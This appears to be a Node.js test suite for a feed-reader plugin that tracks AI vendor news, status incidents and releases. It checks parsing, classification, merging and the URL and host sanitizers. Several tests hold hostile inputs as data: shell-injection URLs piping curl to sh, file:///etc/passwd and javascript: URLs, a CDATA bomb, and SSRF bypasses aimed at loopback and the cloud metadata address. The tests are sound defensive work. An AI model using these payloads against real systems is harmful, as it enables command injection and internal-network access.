const test = require("node:test")
const assert = require("node:assert/strict")
const fs = require("node:fs")
const path = require("node:path")

const Model = require("../Model.js")

// Fixtures are real feed bodies captured live 2026-08-20 from every curated
// source, trimmed to their first six items. Tests run against captured
// bytes, never the network. Recapture procedure: docs/FIXTURES.md.
const fixture = (name) =>
  fs.readFileSync(path.join(__dirname, "fixtures", name), "utf8")

const NOW_MS = Date.parse("2026-08-20T23:00:00Z")

const sourceById = (id) => {
  const src = Model.SOURCES.find((s) => s.id === id)
  assert.ok(src, "unknown source id " + id)
  return src
}

// ---- clean ----

test("clean strips angle brackets so AutoText can never promote to StyledText", () => {
  assert.equal(Model.clean('<img src="http://x/y.png">GPT'), 'img src="http://x/y.png"GPT')
})

test("clean strips controls, bidi marks, and Unicode tag characters", () => {
  assert.equal(Model.clean("a\x00b\x1fc\x7fd"), "abcd")
  assert.equal(Model.clean("a‮b⁦c​d"), "abcd")
  assert.equal(Model.clean("a󠁁b"), "ab")
})

test("clean caps length and tolerates null and undefined", () => {
  assert.equal(Model.clean("x".repeat(500), 64).length, 64)
  assert.equal(Model.clean(null), "")
  assert.equal(Model.clean(undefined), "")
})

// ---- text plumbing ----

test("decodeEntities handles named and numeric entities", () => {
  assert.equal(Model.decodeEntities("a &amp; b &lt;c&gt; &#39;d&#x27;"), "a & b <c> 'd'")
})

test("feedText strips CDATA, decodes, strips tags, then sanitizes", () => {
  assert.equal(Model.feedText("<![CDATA[Introducing <b>GPT-6</b>]]>", 64), "Introducing GPT-6")
  // Entity-encoded markup decodes, then the tags are stripped like direct
  // markup; the inert text content stays, the angle brackets never survive.
  const decoded = Model.feedText("&lt;script&gt;alert(1)&lt;/script&gt;Hello", 64)
  assert.equal(decoded, "alert(1) Hello")
  assert.equal(decoded.indexOf("<"), -1)
})

test("safeUrl accepts only https and refuses option-shaped values", () => {
  assert.equal(Model.safeUrl("https://openai.com/news"), "https://openai.com/news")
  assert.equal(Model.safeUrl("https://github.com/anthropics/claude-code/releases/tag/v2.1.0"),
    "https://github.com/anthropics/claude-code/releases/tag/v2.1.0")
  assert.equal(Model.safeUrl("https://x.test/a?b=c&d=e#frag"), "https://x.test/a?b=c&d=e#frag")
  assert.equal(Model.safeUrl("http://openai.com/news"), "")
  assert.equal(Model.safeUrl("file:///etc/passwd"), "")
  assert.equal(Model.safeUrl("javascript:alert(1)"), "")
  assert.equal(Model.safeUrl("-K https://x"), "")
  assert.equal(Model.safeUrl("https://x/" + "a".repeat(600)), "")
})

test("safeUrl rejects every shell metacharacter that reaches bash -lc via --exec", () => {
  // The notification click action is dispatched as `bash -lc "xdg-open <url>"`,
  // so a URL carrying a shell-active byte would be command injection.
  var bad = [
    "https://evil.test/a;curl${IFS}x|sh",
    "https://evil.test/a`id`",
    "https://evil.test/a$(id)",
    "https://evil.test/a'b",
    'https://evil.test/a"b',
    "https://evil.test/a|b",
    "https://evil.test/a&b;c",
    "https://evil.test/a b",
    "https://evil.test/a<b>"
  ]
  for (const u of bad) assert.equal(Model.safeUrl(u), "", "must reject " + u)
})

test("parseFeed on a 2MB unterminated-CDATA body returns fast, not in minutes", () => {
  var body = "<rss version=\"2.0\"><channel><item><title>"
    + "<![CDATA[".repeat(220000) // ~1.9 MB of unterminated CDATA opens
  var start = process.hrtime.bigint()
  var out = Model.parseFeed(body)
  var ms = Number(process.hrtime.bigint() - start) / 1e6
  assert.ok(Array.isArray(out))
  assert.ok(ms < 1000, "parseFeed took " + ms.toFixed(0) + "ms on a 2MB CDATA-bomb body")
})

test("parseFeed anchors format detection to the document root, not body text", () => {
  // A valid RSS body that quotes Atom syntax inside a description must parse
  // as RSS, not be mis-detected as Atom and yield zero items.
  var body = "<?xml version=\"1.0\"?><rss version=\"2.0\"><channel>"
    + "<item><title>On Atom feeds</title>"
    + "<description>we use &lt;feed&gt; and &lt;entry&gt; tags</description>"
    + "<guid>g1</guid><pubDate>Thu, 20 Aug 2026 10:00:00 GMT</pubDate></item>"
    + "</channel></rss>"
  var out = Model.parseFeed(body)
  assert.equal(out.length, 1)
  assert.equal(out[0].title, "On Atom feeds")
})

// ---- parseFeed against every captured source ----

for (const src of Model.SOURCES) {
  test("parseFeed extracts items from the live " + src.id + " capture", () => {
    const entries = Model.parseFeed(fixture(src.id + ".xml"))
    assert.ok(entries.length >= 1, src.id + " parsed no items")
    for (const e of entries) {
      assert.ok(e.guid.length > 0, "guid present")
      assert.ok(e.title.length > 0, "title present")
      assert.ok(e.url === "" || /^https:\/\//.test(e.url), "url https or empty")
      assert.ok(e.timeMs > Date.parse("2015-01-01"), src.id + " item time parsed")
    }
  })
}

test("parseFeed reads GitHub Atom rel=alternate links, not the self link", () => {
  const entries = Model.parseFeed(fixture("claude-code-releases.xml"))
  assert.ok(entries[0].url.indexOf("github.com/anthropics/claude-code/releases") > 0)
})

test("parseFeed keeps CDATA titles readable", () => {
  const entries = Model.parseFeed(fixture("openai-news.xml"))
  assert.ok(entries.some((e) => !/CDATA/.test(e.title)))
  assert.ok(entries.every((e) => e.title.indexOf("<") === -1))
})

test("parseFeed flags Resolved on closed status incidents", () => {
  const entries = Model.parseFeed(fixture("anthropic-status.xml"))
  assert.ok(entries.some((e) => e.blockResolved === true))
})

test("parseFeed returns [] on junk, html, empty, and oversized bodies", () => {
  assert.deepEqual(Model.parseFeed(""), [])
  assert.deepEqual(Model.parseFeed("not xml at all"), [])
  assert.deepEqual(Model.parseFeed("<html><body>404</body></html>"), [])
  assert.deepEqual(Model.parseFeed("<rss><channel><item>".padEnd(Model.MAX_BODY_CHARS + 10, "x")), [])
})

test("parseFeed caps items per source", () => {
  let body = "<rss version=\"2.0\"><channel>"
  for (let i = 0; i < 200; i++) {
    body += "<item><title>t" + i + "</title><guid>g" + i + "</guid>"
      + "<pubDate>Thu, 20 Aug 2026 10:00:00 GMT</pubDate></item>"
  }
  body += "</channel></rss>"
  assert.ok(Model.parseFeed(body).length <= 60)
})

// ---- classification lanes ----

test("status sources always classify incident, release feeds release", () => {
  assert.equal(Model.classifyLane("anything", "status"), "incident")
  assert.equal(Model.classifyLane("v1.2.3", "releases"), "release")
  assert.equal(Model.classifyLane("chore: bump", "changelog"), "release")
})

test("blog titles split into pricing, release, and engineering", () => {
  assert.equal(Model.classifyLane("New pricing for the API", "blog"), "pricing")
  assert.equal(Model.classifyLane("Updated rate limits for the free tier", "blog"), "pricing")
  assert.equal(Model.classifyLane("Introducing Claude Opus 5", "blog"), "release")
  assert.equal(Model.classifyLane("Gemini 3 Flash is now available", "blog"), "release")
  assert.equal(Model.classifyLane("How we scaled our training cluster", "blog"), "engineering")
  assert.equal(Model.classifyLane("A story about launch parties", "blog"), "engineering")
})

// ---- normalizeItems ----

test("normalizeItems namespaces guids by source and flags changelog quiet", () => {
  const src = sourceById("claude-code-changelog")
  const items = Model.normalizeItems(Model.parseFeed(fixture(src.id + ".xml")), src, NOW_MS)
  assert.ok(items.length > 0)
  for (const it of items) {
    assert.ok(it.guid.startsWith("claude-code-changelog:"))
    assert.equal(it.quiet, true)
    assert.equal(it.lane, "release")
    assert.equal(it.read, false)
  }
})

test("normalizeItems carries resolved only from status blocks", () => {
  const status = sourceById("anthropic-status")
  const items = Model.normalizeItems(Model.parseFeed(fixture(status.id + ".xml")), status, NOW_MS)
  assert.ok(items.every((it) => it.lane === "incident"))
  assert.ok(items.some((it) => it.resolved === true))
  const blog = sourceById("openai-news")
  const blogItems = Model.normalizeItems(Model.parseFeed(fixture(blog.id + ".xml")), blog, NOW_MS)
  assert.ok(blogItems.every((it) => it.resolved === true))
})

// ---- merge, retention, read-state ----

const mkItem = (over) => Object.assign({
  guid: "s:g1", sourceId: "s", vendor: "openai", vendorName: "OpenAI",
  product: "OpenAI SDK", lane: "release", quiet: false, title: "t",
  url: "https://x.test/a", timeMs: NOW_MS - 3600000, resolved: true,
  read: false, used: false
}, over)

test("mergeItems preserves the stored read flag and adopts fresh fields", () => {
  const prev = [mkItem({ read: true, title: "old title", resolved: false, lane: "incident" })]
  const fresh = [mkItem({ title: "new title", resolved: true, lane: "incident" })]
  const merged = Model.mergeItems(prev, fresh, NOW_MS)
  assert.equal(merged.length, 1)
  assert.equal(merged[0].read, true)
  assert.equal(merged[0].title, "new title")
  assert.equal(merged[0].resolved, true)
})

test("mergeItems drops items past retention and sorts newest first", () => {
  const old = mkItem({ guid: "s:old", timeMs: NOW_MS - (Model.RETENTION_DAYS + 2) * 86400000 })
  const a = mkItem({ guid: "s:a", timeMs: NOW_MS - 7200000 })
  const b = mkItem({ guid: "s:b", timeMs: NOW_MS - 60000 })
  const merged = Model.mergeItems([old, a], [b], NOW_MS)
  assert.deepEqual(merged.map((i) => i.guid), ["s:b", "s:a"])
})

test("mergeItems caps the store hard, keeping the newest by recency", () => {
  const prev = []
  for (let i = 0; i < Model.MAX_ITEMS + 50; i++) {
    prev.push(mkItem({ guid: "s:" + i, timeMs: NOW_MS - i * 60000, read: i % 2 === 0 }))
  }
  const merged = Model.mergeItems(prev, [], NOW_MS)
  // The cap is unconditional: an unread-exempt cap let a hostile OPML grow the
  // store past MAX_BODY_CHARS and dark the plugin. Newest-first survives.
  assert.equal(merged.length, Model.MAX_ITEMS)
  const kept = new Set(merged.map((i) => i.guid))
  assert.ok(kept.has("s:0"), "newest survives")
  assert.ok(!kept.has("s:" + (Model.MAX_ITEMS + 49)), "oldest is cut regardless of read state")
})

test("mergeItems does not mutate the caller's prev items in place", () => {
  const prev = [mkItem({ read: true, title: "old", resolved: false })]
  const fresh = [mkItem({ title: "new", resolved: true })]
  Model.mergeItems(prev, fresh, NOW_MS)
  assert.equal(prev[0].title, "old", "prev object left untouched")
  assert.equal(prev[0].resolved, false)
})

// ---- notification gating ----

test("newNotifiables is empty on the first run no matter what arrived", () => {
  const merged = [mkItem({}), mkItem({ guid: "s:g2", lane: "incident", resolved: false })]
  assert.deepEqual(Model.newNotifiables({}, merged, true), [])
})

test("newNotifiables passes new releases and unresolved incidents only", () => {
  const prev = { "s:seen": true }
  const merged = [
    mkItem({ guid: "s:seen" }),
    mkItem({ guid: "s:rel" }),
    mkItem({ guid: "s:quiet", quiet: true }),
    mkItem({ guid: "s:eng", lane: "engineering" }),
    mkItem({ guid: "s:hot", lane: "incident", resolved: false }),
    mkItem({ guid: "s:cold", lane: "incident", resolved: true })
  ]
  const out = Model.newNotifiables(prev, merged, false)
  assert.deepEqual(out.map((i) => i.guid).sort(), ["s:hot", "s:rel"])
})

// ---- clustering and rows ----

test("isoWeekKey buckets by ISO week across a year boundary", () => {
  assert.equal(Model.isoWeekKey(Date.parse("2026-01-01T12:00:00Z")), "2026-w01")
  assert.equal(Model.isoWeekKey(Date.parse("2025-12-29T12:00:00Z")), "2026-w01")
  assert.notEqual(
    Model.isoWeekKey(Date.parse("2026-08-16T12:00:00Z")),
    Model.isoWeekKey(Date.parse("2026-08-17T12:00:00Z")))
})

test("laneRows clusters one source's same-week release burst and prefixes the product", () => {
  const monday = Date.parse("2026-08-17T10:00:00Z")
  const items = [
    mkItem({ guid: "s:1", sourceId: "cc", product: "Claude Code", timeMs: monday, title: "v1.0.1" }),
    mkItem({ guid: "s:2", sourceId: "cc", product: "Claude Code", timeMs: monday + 86400000, title: "v1.0.2" }),
    mkItem({ guid: "s:3", sourceId: "cc", product: "Claude Code", timeMs: monday + 2 * 86400000, title: "v1.0.3", read: true })
  ]
  const rows = Model.laneRows(items, "release", 12)
  assert.equal(rows.length, 1)
  assert.equal(rows[0].count, 3)
  // The product is the row label; the title is the tag alone (so a row never
  // doubles its own name against the label column).
  assert.equal(rows[0].label, "Claude Code")
  assert.ok(rows[0].title.startsWith("v1.0."), "title is the tag, not the product")
  assert.ok(rows[0].title.indexOf("(+2 more this week)") > 0)
  assert.equal(rows[0].read, false, "one unread member keeps the cluster unread")
  assert.equal(rows[0].guids.length, 3)
})

test("laneRows never merges two products of the same vendor into one cluster", () => {
  const monday = Date.parse("2026-08-17T10:00:00Z")
  const items = [
    mkItem({ guid: "s:cc", sourceId: "cc", vendor: "anthropic", vendorName: "Anthropic", product: "Claude Code", timeMs: monday, title: "v2.1.238" }),
    mkItem({ guid: "s:sdk", sourceId: "sdk", vendor: "anthropic", vendorName: "Anthropic", product: "Anthropic SDK", timeMs: monday, title: "v0.44.0" })
  ]
  const rows = Model.laneRows(items, "release", 12)
  assert.equal(rows.length, 2, "same vendor, different product = two rows")
  assert.ok(rows.some((r) => r.label === "Claude Code" && r.title === "v2.1.238"))
  assert.ok(rows.some((r) => r.label === "Anthropic SDK" && r.title === "v0.44.0"))
})

test("laneRows blog release falls back to vendor label with a bare title", () => {
  const items = [
    mkItem({ guid: "s:g", sourceId: "dm", vendor: "google", vendorName: "Google DeepMind", product: "", title: "Introducing Gemini 3.7 Flash", timeMs: NOW_MS })
  ]
  const rows = Model.laneRows(items, "release", 12)
  assert.equal(rows[0].label, "Google DeepMind")
  assert.equal(rows[0].title, "Introducing Gemini 3.7 Flash", "no product prefix baked into the title")
})

test("laneRows collapses a quiet changelog week to a fixed summary, never a commit subject", () => {
  const monday = Date.parse("2026-08-17T10:00:00Z")
  const items = [
    mkItem({ guid: "s:c1", sourceId: "ccl", product: "Claude Code", quiet: true, timeMs: monday, title: "chore: Update CHANGELOG.md" }),
    mkItem({ guid: "s:c2", sourceId: "ccl", product: "Claude Code", quiet: true, timeMs: monday + 3600000, title: "fix: typo" })
  ]
  const rows = Model.laneRows(items, "release", 12)
  assert.equal(rows.length, 1)
  assert.equal(rows[0].label, "Claude Code")
  assert.equal(rows[0].title, "changelog · 2 commits this week")
  assert.ok(rows[0].title.indexOf("chore:") === -1, "raw commit subject never surfaces")
})

test("laneRows orders unresolved incidents first, then used vendors", () => {
  const items = [
    mkItem({ guid: "s:cold", lane: "incident", resolved: true, timeMs: NOW_MS }),
    mkItem({ guid: "s:hot", lane: "incident", resolved: false, timeMs: NOW_MS - 9999000 })
  ]
  const rows = Model.laneRows(items, "incident", 12)
  assert.deepEqual(rows.map((r) => r.guid), ["s:hot", "s:cold"])

  const eng = [
    mkItem({ guid: "s:new", lane: "engineering", timeMs: NOW_MS }),
    mkItem({ guid: "s:used", lane: "engineering", timeMs: NOW_MS - 9999000, used: true })
  ]
  const engRows = Model.laneRows(eng, "engineering", 12)
  assert.deepEqual(engRows.map((r) => r.guid), ["s:used", "s:new"])
})

test("laneRows respects the row cap", () => {
  const items = []
  for (let i = 0; i < 30; i++) {
    items.push(mkItem({ guid: "s:" + i, lane: "engineering", timeMs: NOW_MS - i }))
  }
  assert.equal(Model.laneRows(items, "engineering", 6).length, 6)
})

test("laneRows caps resolved incidents at 2 when nothing is active, lifts when one is", () => {
  const calm = []
  for (let i = 0; i < 6; i++) {
    calm.push(mkItem({ guid: "s:" + i, lane: "incident", resolved: true, timeMs: NOW_MS - i * 1000 }))
  }
  assert.equal(Model.laneRows(calm, "incident", 6).length, 2, "calm day shows 2 resolved rows")

  const active = calm.concat([mkItem({ guid: "s:hot", lane: "incident", resolved: false, timeMs: NOW_MS })])
  assert.ok(Model.laneRows(active, "incident", 6).length > 2, "an active incident lifts the cap")
})

// ---- personalization ----

test("usedVendorsFromAgentFiles maps agent records to vendors and ignores strangers", () => {
  const used = Model.usedVendorsFromAgentFiles(["claude.json", "codex.json", "mystery.json"])
  assert.deepEqual(used, { anthropic: true, openai: true })
})

test("markUsed stamps items whose vendor the user runs", () => {
  const items = [mkItem({ vendor: "anthropic" }), mkItem({ guid: "s:2", vendor: "meta" })]
  Model.markUsed(items, { anthropic: true })
  assert.equal(items[0].used, true)
  assert.equal(items[1].used, false)
})

// ---- pill discipline ----

test("counts ignores engineering unread and quiet items", () => {
  const items = [
    mkItem({ guid: "s:1" }),
    mkItem({ guid: "s:2", lane: "pricing" }),
    mkItem({ guid: "s:3", lane: "engineering" }),
    mkItem({ guid: "s:4", quiet: true }),
    mkItem({ guid: "s:5", read: true })
  ]
  const c = Model.counts(items)
  assert.equal(c.unread, 2)
  assert.equal(c.incidents, 0)
})

test("pillText: incidents beat releases, quiet means empty", () => {
  assert.equal(Model.pillText({ incidents: 1, unread: 5, firstIncidentVendor: "OpenAI" }), "OpenAI incident")
  assert.equal(Model.pillText({ incidents: 2, unread: 0, firstIncidentVendor: "OpenAI" }), "2 incidents")
  assert.equal(Model.pillText({ incidents: 0, unread: 1, firstIncidentVendor: "" }), "AI: 1 new")
  assert.equal(Model.pillText({ incidents: 0, unread: 3, firstIncidentVendor: "" }), "AI: 3 new")
  assert.equal(Model.pillText({ incidents: 0, unread: 0, firstIncidentVendor: "" }), "")
})

test("ageText compresses to the natural unit", () => {
  assert.equal(Model.ageText(NOW_MS - 30000, NOW_MS), "just now")
  assert.equal(Model.ageText(NOW_MS - 5 * 60000, NOW_MS), "5m ago")
  assert.equal(Model.ageText(NOW_MS - 3 * 3600000, NOW_MS), "3h ago")
  assert.equal(Model.ageText(NOW_MS - 5 * 86400000, NOW_MS), "5d ago")
  assert.equal(Model.ageText(0, NOW_MS), "")
})

// ---- state record ----

test("parseState round-trips what the poller writes", () => {
  const state = {
    generatedAt: NOW_MS,
    sources: [{ id: "openai-news", title: "OpenAI News", ok: true, error: "" }],
    items: [mkItem({})]
  }
  const parsed = Model.parseState(JSON.stringify(state))
  assert.equal(parsed.valid, true)
  assert.equal(parsed.generatedAt, NOW_MS)
  assert.equal(parsed.items.length, 1)
  assert.equal(parsed.items[0].guid, "s:g1")
  assert.equal(parsed.sources[0].ok, true)
})

test("parseState returns the zero object on malformed input", () => {
  assert.equal(Model.parseState("").valid, false)
  assert.equal(Model.parseState("{not json").valid, false)
  assert.equal(Model.parseState("{\"items\":\"nope\"}").valid, false)
})

test("parseState sanitizes lane, url, and drops broken rows", () => {
  const state = {
    generatedAt: 1,
    sources: [],
    items: [
      mkItem({ lane: "evil-lane" }),
      mkItem({ guid: "s:2", url: "file:///etc/passwd" }),
      { title: "no guid" }
    ]
  }
  const parsed = Model.parseState(JSON.stringify(state))
  assert.equal(parsed.items.length, 2)
  assert.equal(parsed.items[0].lane, "engineering")
  assert.equal(parsed.items[1].url, "")
})

// ---- OPML ----

test("toOpml and parseOpml round-trip the curated set", () => {
  const opml = Model.toOpml(Model.SOURCES, [{ title: "My Feed", url: "https://example.test/feed.xml" }])
  const parsed = Model.parseOpml(opml)
  assert.equal(parsed.length, Model.SOURCES.length + 1)
  assert.ok(parsed.some((o) => o.url === "https://example.test/feed.xml"))
})

test("parseOpml keeps only https outlines and refuses non-opml bodies", () => {
  const opml = '<opml version="2.0"><body>'
    + '<outline type="rss" title="ok" xmlUrl="https://a.test/f"/>'
    + '<outline type="rss" title="bad" xmlUrl="http://b.test/f"/>'
    + '<outline type="rss" title="none"/>'
    + "</body></opml>"
  const parsed = Model.parseOpml(opml)
  assert.equal(parsed.length, 1)
  assert.equal(parsed[0].url, "https://a.test/f")
  assert.deepEqual(Model.parseOpml("<rss></rss>"), [])
})

// ---- source table hygiene ----

test("every curated source is https, unique, and carries a known kind", () => {
  const seen = new Set()
  for (const src of Model.SOURCES) {
    assert.ok(/^https:\/\//.test(src.url), src.id + " url https")
    assert.ok(!seen.has(src.id), "duplicate id " + src.id)
    seen.add(src.id)
    assert.ok(["blog", "status", "releases", "changelog"].includes(src.kind))
    assert.ok(src.vendor.length > 0 && src.vendorName.length > 0 && src.title.length > 0)
  }
})

// ---------------------------------------------------------------------------
// Host policy for user-imported feeds.
//
// Reported by the marketplace reviewer on submission 1229: the filter treated
// URL userinfo as part of the hostname, so "https://user@127.0.0.1/feed"
// passed the private-host check and curl was then pointed at loopback. The
// check lived in Service.qml where no test could reach it, which is why it
// shipped. It lives in Model.js now and these cases pin it.
test("isPublicHost rejects the reported userinfo bypass", () => {
  assert.equal(Model.isPublicHost("https://user@127.0.0.1/feed"), false)
})

test("isPublicHost rejects userinfo with a password, which hid the host entirely", () => {
  // The old pattern stopped at ':' and captured only "user".
  assert.equal(Model.isPublicHost("https://user:pass@127.0.0.1/"), false)
  assert.equal(Model.isPublicHost("https://user:pass@localhost/"), false)
})

test("isPublicHost rejects loopback and private ranges written plainly", () => {
  for (const u of ["https://127.0.0.1/f", "https://10.0.0.5/f", "https://192.168.1.1/f",
                   "https://172.16.0.1/f", "https://169.254.169.254/f", "https://0.0.0.0/f"]) {
    assert.equal(Model.isPublicHost(u), false, u)
  }
})

test("isPublicHost rejects loopback written as an integer", () => {
  // Both resolve to 127.0.0.1 without containing a single dot.
  assert.equal(Model.isPublicHost("https://2130706433/f"), false)
  assert.equal(Model.isPublicHost("https://0x7f000001/f"), false)
})

test("isPublicHost rejects internal suffixes including a trailing dot", () => {
  for (const u of ["https://localhost/f", "https://localhost./f", "https://box.local/f",
                   "https://git.internal/f", "https://nas.lan/f", "https://wiki.corp/f"]) {
    assert.equal(Model.isPublicHost(u), false, u)
  }
})

test("isPublicHost rejects an explicit port and an IPv6 literal", () => {
  assert.equal(Model.isPublicHost("https://example.com:8080/f"), false)
  assert.equal(Model.isPublicHost("https://[::1]/f"), false)
})

test("isPublicHost rejects anything that is not https", () => {
  assert.equal(Model.isPublicHost("http://example.com/f"), false)
  assert.equal(Model.isPublicHost("file:///etc/passwd"), false)
  assert.equal(Model.isPublicHost(""), false)
  assert.equal(Model.isPublicHost(null), false)
})

test("isPublicHost still allows the real feed hosts this plugin ships", () => {
  for (const u of ["https://openai.com/blog/rss.xml",
                   "https://raw.githubusercontent.com/Olshansk/rss-feeds/main/feeds/a.xml",
                   "https://status.anthropic.com/history.rss"]) {
    assert.equal(Model.isPublicHost(u), true, u)
  }
})
